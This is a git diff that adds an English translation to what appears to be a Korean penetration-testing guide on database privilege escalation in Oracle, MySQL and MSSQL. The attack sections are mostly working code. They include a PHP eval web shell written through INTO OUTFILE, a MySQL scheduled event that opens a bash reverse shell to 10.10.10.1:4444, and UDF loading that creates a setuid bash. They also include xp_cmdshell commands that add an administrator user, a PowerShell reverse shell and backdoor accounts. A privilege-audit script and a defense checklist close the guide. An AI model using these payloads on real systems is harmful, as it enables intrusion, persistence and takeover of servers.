@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # DB 권한 상승 — 저권한 계정에서 DBA/OS까지
 
 ## 1. 권한 상승 경로
@@ -336,4 +342,325 @@ MSSQL 전용:
   □ xp_cmdshell 기본 비활성화 유지
   □ Linked Server 최소화 및 보안 설정 강화
   □ Impersonation 권한 감사
+```
+
+---
+
+<a name="english"></a>
+
+# DB Privilege Escalation — From Low-Privilege Account to DBA/OS
+
+## 1. Privilege Escalation Path
+
+```
+Regular Account
+    ↓  Role (ROLE) abuse
+    ↓  Stored procedure vulnerabilities
+    ↓  SQLi → DB account takeover
+DBA Account
+    ↓  UDF / Job / extproc
+    ↓  File read/write
+OS Shell (DB service account privileges)
+    ↓  Local privilege escalation (separate phase)
+root / SYSTEM
+```
+
+---
+
+## 2. Oracle Privilege Escalation
+
+### 2-1. Check Current Privileges and Roles
+
+```sql
+-- Current user
+SELECT USER FROM DUAL;
+
+-- System privileges of current user
+SELECT PRIVILEGE FROM SESSION_PRIVS;
+
+-- Roles of current user
+SELECT GRANTED_ROLE FROM SESSION_ROLES;
+
+-- Users with DBA role
+SELECT GRANTEE FROM DBA_ROLE_PRIVS WHERE GRANTED_ROLE = 'DBA';
+
+-- List of executable procedures
+SELECT OBJECT_NAME, OBJECT_TYPE FROM ALL_OBJECTS
+WHERE OBJECT_TYPE IN ('PROCEDURE','FUNCTION','PACKAGE')
+AND OWNER != USER;
+```
+
+### 2-2. Abusing CREATE ANY PROCEDURE
+
+```sql
+-- With CREATE ANY PROCEDURE privilege, can overwrite SYS-owned procedures
+-- Target: vulnerable Oracle versions (some 11.2 and below)
+
+-- Check privilege
+SELECT PRIVILEGE FROM SESSION_PRIVS WHERE PRIVILEGE LIKE '%PROCEDURE%';
+
+-- SYS.GRANT_DBA procedure abuse example (pre-patch versions)
+CREATE OR REPLACE PROCEDURE sys.evil_proc AUTHID CURRENT_USER AS
+BEGIN
+  EXECUTE IMMEDIATE 'GRANT DBA TO ' || USER;
+END;
+/
+```
+
+### 2-3. DBMS_XMLQUERY / DBMS_METADATA Injection
+
+```sql
+-- Privilege escalation via DBMS_XMLQUERY (CVE-2010-3600, etc.)
+-- Execute queries in SYS context via parameter injection
+
+-- Check patch: verify component versions in DBA_REGISTRY
+SELECT COMP_NAME, VERSION, STATUS FROM DBA_REGISTRY
+WHERE COMP_NAME LIKE '%XML%';
+```
+
+### 2-4. SQLi Inside Stored Procedures (Second-Order)
+
+```sql
+-- When a procedure contains dynamic SQL
+-- Pattern where input values go directly into EXECUTE IMMEDIATE without validation
+
+-- Vulnerable example
+CREATE OR REPLACE PROCEDURE get_user_data(p_name IN VARCHAR2) AS
+  v_sql VARCHAR2(200);
+BEGIN
+  v_sql := 'SELECT * FROM users WHERE name = ''' || p_name || '''';
+  EXECUTE IMMEDIATE v_sql;  -- SQLi possible
+END;
+
+-- Attack
+EXEC get_user_data(q'[' UNION SELECT 1,user,3 FROM dual--]');
+```
+
+---
+
+## 3. MySQL Privilege Escalation
+
+### 3-1. Check Current Privileges
+
+```sql
+-- Current user privileges
+SHOW GRANTS FOR CURRENT_USER();
+
+-- Check global privileges (SUPER, FILE, etc.)
+SELECT user, Super_priv, File_priv, Execute_priv
+FROM mysql.user WHERE user = CURRENT_USER();
+```
+
+### 3-2. Exploiting Vulnerable MySQL Configuration
+
+```sql
+-- 1. FILE privilege → web shell / read config files
+SELECT LOAD_FILE('/etc/mysql/my.cnf');
+SELECT '<?php @eval($_POST[0]);?>' INTO OUTFILE '/var/www/html/sh.php';
+
+-- 2. Function path trick (when secure_file_priv = '')
+SELECT @@datadir;       -- /var/lib/mysql/
+SELECT @@basedir;       -- /usr/
+
+-- 3. Event scheduler abuse (requires EVENT privilege)
+SET GLOBAL event_scheduler = ON;
+CREATE EVENT backdoor
+ON SCHEDULE EVERY 1 SECOND
+DO CALL sys_exec('bash -i >& /dev/tcp/10.10.10.1/4444 0>&1');
+```
+
+### 3-3. MySQL 8.x Account Manipulation
+
+```sql
+-- Plugin bypass (caching_sha2_password → mysql_native_password)
+ALTER USER 'root'@'localhost'
+  IDENTIFIED WITH mysql_native_password BY 'newpass';
+
+-- Create backdoor account (after gaining root access)
+CREATE USER 'backdoor'@'%' IDENTIFIED BY 'P@ssw0rd!';
+GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
+FLUSH PRIVILEGES;
+```
+
+### 3-4. Raptor_UDF2 Technique (Classic MySQL Privilege Escalation)
+
+UDF (User Defined Function) injection loads a shared library in MySQL to obtain OS-level command execution. With FILE privilege, the `sys_exec()` function can be created to execute OS commands.
+
+```bash
+# Prepare tool
+git clone https://github.com/RalfHacker/raptor_udf2.git
+gcc -shared -fPIC raptor_udf2.c -o raptor_udf2.so
+
+# After MySQL login
+mysql -u root -p
+```
+
+```sql
+USE mysql;
+CREATE TABLE foo(line BLOB);
+INSERT INTO foo VALUES(LOAD_FILE('/tmp/raptor_udf2.so'));
+SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
+CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
+SELECT do_system('id > /tmp/out && chmod 755 /tmp/out');
+SELECT do_system('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash');
+```
+
+---
+
+## 4. MSSQL Privilege Escalation
+
+### 4-1. Enabling xp_cmdshell and Command Execution
+
+```sql
+-- Enable xp_cmdshell (requires sysadmin)
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+
+-- Execute commands
+EXEC xp_cmdshell 'whoami';
+EXEC xp_cmdshell 'net user hacker P@ss123 /add';
+EXEC xp_cmdshell 'net localgroup administrators hacker /add';
+
+-- Reverse shell
+EXEC xp_cmdshell 'powershell -nop -c "$c=New-Object Net.Sockets.TCPClient(\"10.10.10.1\",4444);..."';
+```
+
+### 4-2. Linked Server Abuse
+
+```sql
+-- List linked servers
+SELECT name, provider FROM sys.servers WHERE is_linked = 1;
+
+-- Execute commands on remote DB
+EXEC ('xp_cmdshell ''whoami''') AT [linked_server_name];
+
+-- Privilege escalation via linked server chain
+-- Move from server A (low privilege) → server B (high privilege)
+```
+
+### 4-3. Impersonation
+
+```sql
+-- Check impersonatable users
+SELECT DISTINCT b.name
+FROM sys.database_permissions a
+JOIN sys.database_principals b ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE';
+
+-- Execute as different user and escalate privileges
+EXECUTE AS LOGIN = 'sa';
+EXEC xp_cmdshell 'whoami';
+REVERT;
+```
+
+---
+
+## 5. Automation — DB Privilege Audit Tool
+
+```python
+import pymysql
+import cx_Oracle
+import argparse
+import sys
+from dataclasses import dataclass, field
+
+@dataclass
+class PrivEscResult:
+    user: str
+    db_type: str
+    dangerous_privs: list[str] = field(default_factory=list)
+    escalation_paths: list[str] = field(default_factory=list)
+
+def check_mysql_privs(host: str, user: str, password: str) -> PrivEscResult:
+    result = PrivEscResult(user=user, db_type="MySQL")
+    try:
+        conn = pymysql.connect(host=host, user=user, password=password, db='mysql')
+        cur = conn.cursor()
+
+        # Check dangerous privileges
+        danger_privs = ["Super_priv", "File_priv", "Execute_priv",
+                        "Create_routine_priv", "Alter_routine_priv",
+                        "Create_user_priv", "Repl_slave_priv"]
+        cur.execute(f"SELECT {','.join(danger_privs)} FROM user WHERE user=%s", (user,))
+        row = cur.fetchone()
+        if row:
+            for i, priv in enumerate(danger_privs):
+                if row[i] == 'Y':
+                    result.dangerous_privs.append(priv)
+
+        # Determine escalation paths
+        if "File_priv" in result.dangerous_privs:
+            result.escalation_paths.append("FILE priv → LOAD_FILE / INTO OUTFILE")
+        if "Super_priv" in result.dangerous_privs:
+            result.escalation_paths.append("SUPER priv → UDF loading, event scheduler")
+        if "Execute_priv" in result.dangerous_privs:
+            result.escalation_paths.append("EXECUTE priv → UDF sys_exec callable")
+
+        # Check for existing UDF functions
+        cur.execute("SELECT name FROM mysql.func WHERE ret=0")
+        udfs = [r[0] for r in cur.fetchall()]
+        if udfs:
+            result.escalation_paths.append(f"UDF functions found: {udfs}")
+
+        cur.close()
+        conn.close()
+    except Exception as e:
+        result.escalation_paths.append(f"Connection failed: {e}")
+    return result
+
+def print_result(r: PrivEscResult) -> None:
+    print(f"\n[{r.db_type}] User: {r.user}")
+    print(f"  Dangerous privileges: {r.dangerous_privs or 'None'}")
+    if r.escalation_paths:
+        print("  Escalation paths:")
+        for path in r.escalation_paths:
+            print(f"    → {path}")
+    else:
+        print("  Escalation paths: None found")
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="DB privilege audit tool")
+    parser.add_argument("--host", required=True)
+    parser.add_argument("--user", required=True)
+    parser.add_argument("--password", required=True)
+    parser.add_argument("--db-type", choices=["mysql", "oracle"], default="mysql")
+    args = parser.parse_args()
+
+    if args.db_type == "mysql":
+        result = check_mysql_privs(args.host, args.user, args.password)
+        print_result(result)
+    else:
+        print("Oracle audit requires DBA account")
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 6. Privilege Escalation Defense
+
+```
+Common Principles:
+  □ Principle of least privilege — grant only SELECT/INSERT to app accounts
+  □ Never use DBA/SA accounts for daily operations
+  □ Use AUTHID CURRENT_USER instead of DEFINER in stored procedures
+  □ Mandatory parameter binding for dynamic SQL (no string concatenation)
+
+Oracle-specific:
+  □ REVOKE unnecessary packages from PUBLIC role
+  □ Remove EXECUTE ANY PROCEDURE privilege
+  □ Disable Java stored procedures if not needed
+
+MySQL-specific:
+  □ Restrict plugin_dir write access to root only
+  □ Default event_scheduler to OFF
+  □ Minimize FILE privilege, configure secure_file_priv
+
+MSSQL-specific:
+  □ Keep xp_cmdshell disabled by default
+  □ Minimize Linked Servers and strengthen security configuration
+  □ Audit Impersonation privileges
 ```
